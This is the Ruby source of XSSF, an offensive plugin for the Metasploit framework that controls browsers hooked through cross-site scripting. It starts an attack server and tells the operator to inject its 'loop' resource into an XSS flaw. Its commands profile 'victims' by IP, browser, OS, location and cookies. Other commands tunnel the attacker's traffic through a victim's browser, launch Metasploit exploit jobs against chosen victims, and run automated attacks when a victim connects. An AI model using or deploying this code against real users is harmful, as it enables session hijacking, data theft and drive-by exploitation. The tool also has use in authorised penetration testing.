require 'cgi'

module Msf

# This plugin manages a new XSS framework integrated to Metasploit
class Plugin::XSSF < Msf::Plugin
	include Msf::Xssf::XssfMaster
	
	#
	# Called when an instance of the plugin is created.
	#
	def initialize(framework, opts)
		super
		
		clean_database
		Msf::Xssf::AUTO_ATTACKS.clear
		
		@DefaultHost = '0.0.0.0'
		@DefaultPort = 8888
		@DefaultUri  = '/'
		@server 	 = nil

		# Check if parameters are correct if entered
		opts['ServerPort'].to_s =~ /^(6553[0-5]|655[0-2]\d|65[0-4]\d\d|6[0-4]\d{3}|[1-5]\d{4}|[1-9]\d{0,3}|0)$/ ? port = opts['ServerPort'] : port = @DefaultPort
		opts['ServerHost'].to_s =~ /^([0-9]{1,3}\.){3}[0-9]{1,3}$/ ? host = opts['ServerHost'].to_s : host = @DefaultHost
		opts['ServerUri'].to_s  =~ /^\/?([a-zA-Z0-9\-\._\?\,\'\/\\\+&amp;%\$#\=~])+$/ ? uri = opts['ServerUri'].to_s : uri = @DefaultUri
		
		
		if (!framework.db.active)
			print_error("The database backend has not been initialized ...")
			print_status("Trying to use the default 'sqlite3' one ...")
			
			if framework.db.drivers.include?('sqlite3') 
				print_status("Driver 'sqlite3' found, creating database ...")
			else
				print_error("Driver 'sqlite3' not found, please initialize database manually")
				raise PluginLoadError.new("Driver 'sqlite3' not found")
			end
			
			opts = { 'adapter' => 'sqlite3', 'database' => ::File.join(Msf::Config.config_directory, 'xssf.db') }

			if (::File.exists?(::File.join(Msf::Config.config_directory, 'xssf.db')))
				print_status("The specified database 'xssf.db' file already exists, connecting")
			else
				print_status("Creating a new database instance in 'xssf.db' file ...")
				require_library_or_gem('sqlite3')
			end

			if (not framework.db.connect(opts))
				raise PluginLoadError.new("Failed to connect to the database: #{framework.db.error}")
			end
		end

		framework.plugins.each { |p| raise PluginLoadError.new("This plugin should not be loaded more than once") if (p.class == Msf::Plugin::XSSF)	}
		
		begin		
			raise "Database Busy..." if not start(host, port, uri)
			add_console_dispatcher(ConsoleCommandDispatcher)
			print_line("%cya" + Xssf::XssfBanner.to_s + "%clr\n\n")
			print_good("Server started : http://#{real_address(host)}:#{port}#{uri}\n")
			print_status("Please, inject '#{"http://#{real_address(host)}:#{port}#{uri}"}loop' resource in an XSS") 
		rescue
			raise PluginLoadError.new("Error starting server : #{$!}")
		end
	end

	#
	# Removes the console menus created by the plugin
	#
	def cleanup
		stop
		remove_console_dispatcher('XSSF')
	end
	
	#
	# This method returns a short, friendly name for the plugin.
	#
	def name
		"XSSF"
	end

	#
	# Returns description of the plugin (60 chars max)
	#
	def desc
		"XSS Framework managing XSS modules"
	end


	# This class implements a sample console command dispatcher.
	class ConsoleCommandDispatcher
		include Msf::Ui::Console::CommandDispatcher
		include Msf::Xssf::XssfMaster

		#
		# The dispatcher's name.
		#
		def name
			"XSSF"
		end

		#
		# Commands supported by this dispatcher.
		#
		def commands
			{
				"xssf_victims"   			=> "Displays all victims",
				"xssf_active_victims"  		=> "Displays active victims",
				"xssf_information"			=> "Displays information about a given victim",
				
				"xssf_servers"   			=> "Displays all used attack servers",
				"xssf_tunnel"   			=> "Do a tunnel between attacker and victim",
				"xssf_export_attacks"		=> "Exports attacks log for a given victim",
				
				"xssf_add_auto_attack"  	=> "Add a new automated attack (launched automatically at victim's connection)",
				"xssf_remove_auto_attack"	=> "Remove an automated attack",
				"xssf_auto_attacks"			=> "Displays XSSF automated attacks",
				
				"xssf_exploit"				=> "Launches a launched module (running in jobs) on a given victim",
				"xssf_test"					=> "Opens a new test page",
				
				"xssf_banner"				=> "Prints XSS Framework banner !"
			}
		end

		def cmd_xssf_exploit(*args)
			if (args.length == 2)
				url = nil 
				begin
					raise "Wrong arguments : [VictimID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
					raise "Wrong arguments : [JobID] must be an Integer" unless (args[1].to_s =~ /^([0-9]+)$/)
			
					print_status("Searching Metasploit launched module with JobID = '#{args[1].to_s}'...")
					
					# Watching if jobID is an running module
					if (obj = framework.jobs[args[1]])
						print_good("A running exploit exists : '#{obj.name}'")
						datastore = obj.ctx[0].datastore
						url = "http://#{real_address(datastore['SRVHOST'])}:#{datastore['SRVPORT']}#{obj.ctx[0].get_resource}"

						raise "Error running the attack... (check victim ID and try to run again)" if !attack_victim(args[0], url, obj.name)
					else
						raise "No Metasploit launched module was found... Please run one first or check JobID parameter !"
					end
					
					print_status("Exploit execution started, press [CTRL + C] to stop it !") 
					# Loop and wait for console interruption
					while (true) do; Rex::ThreadSafe.sleep(5); end;
					
				rescue ::Interrupt
					print_error("Exploit interrupted by the console user")
				rescue ::Exception
					print_error("#{$!}")
				end
				
				clean_victim(args[0])
				clean_victims(url)
			else
				print_error("Wrong arguments : xssf_exploit [VictimID] [JobID]")
				print_error("Use MSF 'jobs' command to see running jobs")
			end
		end


		def cmd_xssf_tunnel(*args)
			if (args.length == 1)
				begin
					raise "Wrong arguments : [VictimID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)

					tunnel_victim(args[0])		
					print_status("Creating new tunnel with victim '#{args[0].to_s}' ...")
					
					print_status("You can now add XSSF Server as your browser proxy and visit domain of victim '#{args[0].to_s}' ! ;-)")

					while (victim_tunneled) do; 	Rex::ThreadSafe.sleep(5);	end
					
					raise "Victim #{args[0].to_s} is no longer active"
				rescue ::Interrupt
					print_error("Tunnel interrupted by the console user")
				rescue ::Exception
					print_error("#{$!}")
				end
				
				clean_victim(args[0])
				print_status("Removing tunnel with victim #{args[0].to_s} ...")
			else
				print_error("Wrong arguments : cmd_xssf_tunnel_victim [VictimID]")
			end
		end


		def cmd_xssf_export_attacks(*args)
			# Check if victim ID is correct if one is entered
			if (args.length == 1)
				if (args[0].to_s =~ /^([0-9]+)$/)
					Thread.new do
						Rex::Compat.open_browser(active_server + Msf::Xssf::VICTIM_LOG + "?#{Msf::Xssf::PARAM_ID}=#{args[0].to_i}")
					end
				else
					print_error("Wrong arguments : [VictimID] must be an Integer")
				end
			else
				print_error("Wrong arguments : xssf_export_attacks [VictimID]")
			end
		end

		
		def cmd_xssf_information(*args)
			# Check if victim ID is correct if one is entered
			if (args.length == 1)
				print_error("Wrong arguments : [VictimID] must be an Integer") unless (args[0].to_s =~ /^([0-9]+)$/)
				
				victim = get_victim(args[0])
				
				if (victim)
					print_line
					print_line "INFORMATION ABOUT VICTIM #{args[0]}"
					print_line "============================"
					print_line "IP ADDRESS \t: #{victim.ip}"
					print_line "ACTIVE \t\t: #{victim.active ? "TRUE" : "FALSE"}"
					print_line "FIRST REQUEST \t: #{victim.first_request}"
					print_line "LAST REQUEST \t: #{victim.last_request}"
					print_line "CONNECTION TIME : #{victim.last_request - victim.first_request} seconds"
					print_line "BROWSER NAME \t: #{victim.browser_name}"
					print_line "BROWSER VERSION : #{victim.browser_version}"
					print_line "OS NAME\t\t: #{victim.os_name}"
					print_line "OS VERSION \t: #{victim.os_version}"
					print_line "ARCHITECTURE \t: #{victim.arch}"
					print_line "LOCATION \t: #{victim.location}"
					print_line "COOKIES ?\t: #{victim.cookie}"
					print_line "RUNNING ATTACK \t: #{victim.current_attack_url ? victim.current_attack_url : "NONE"}"
				else
					print_error("Error getting the victim!")
				end
				

			else
				print_error("Wrong arguments : cmd_xssf_information [VictimID]")
			end
		end

		
		def cmd_xssf_auto_attacks(*args)
			print_good("Automated attacks :")
			Msf::Xssf::AUTO_ATTACKS.each do |a|
				if (framework.jobs[a])
					puts "\t * #{a} - #{framework.jobs[a].name}"
				else
					puts "\t * Job #{a} is no longuer active... please remove it !"
				end
			end
			
			puts "\t * NONE" if Msf::Xssf::AUTO_ATTACKS.empty?
		end
		
		
		def cmd_xssf_add_auto_attack(*args)	
			if (args.length == 1)	
				raise "Wrong arguments : [JobID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
			
				print_status("Searching Metasploit launched module with JobID = '#{args[0].to_s}'...")
					
				# Watching if jobID is an running module
				if (framework.jobs[args[0]])
					Msf::Xssf::AUTO_ATTACKS << args[0] if not Msf::Xssf::AUTO_ATTACKS.include?(args[0])
					print_good("Job '#{args[0]}' added to automated attacks")
				else
					print_error("No Metasploit launched module was found... Please run one first or check JobID parameter !")
				end
			else
				print_error("Wrong arguments : cmd_xssf_add_auto_attack [JobID]")
				print_error("Use MSF 'jobs' command to see running jobs")
			end
		end
		
		
		def cmd_xssf_remove_auto_attack(*args)	
			if (args.length == 1)	
				raise "Wrong arguments : [JobID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
			
				Msf::Xssf::AUTO_ATTACKS.delete(args[0])
				print_good("Job '#{args[0]}' removed from automated attacks")
			else
				print_error("Wrong arguments : cmd_xssf_remove_auto_attack [JobID]")
				print_error("Use MSF 'jobs' command to see running jobs")
			end
		end

		def cmd_xssf_banner			(*args);	print_line("%cya" + Xssf::XssfBanner.to_s + "%clr\n\n");																																																						end
		def cmd_xssf_test			(*args);	Thread.new do; Rex::Compat.open_browser(active_server + Msf::Xssf::VICTIM_TEST); end;																																															end
		def cmd_xssf_servers		(*args);	show_table("Servers", DBManager::XssfServer);																																																									end	
		def cmd_xssf_victims		(*args);	show_table("Victims", DBManager::XssfVictim, ["1 = 1"], ["first_request", "last_request", "tunneled", "current_attack_url", "location", "os_name", "os_version", "arch"]);				print_status("Use xssf_information [VictimID] to see more information about a victim");	end
		def cmd_xssf_active_victims	(*args);	show_table("Victims", DBManager::XssfVictim, ["active = ?", true], ["first_request", "last_request", "tunneled", "current_attack_url", "location", "os_name", "os_version", "arch"]); 	print_status("Use xssf_information [VictimID] to see more information about a victim");	end
	end
	
protected
end
end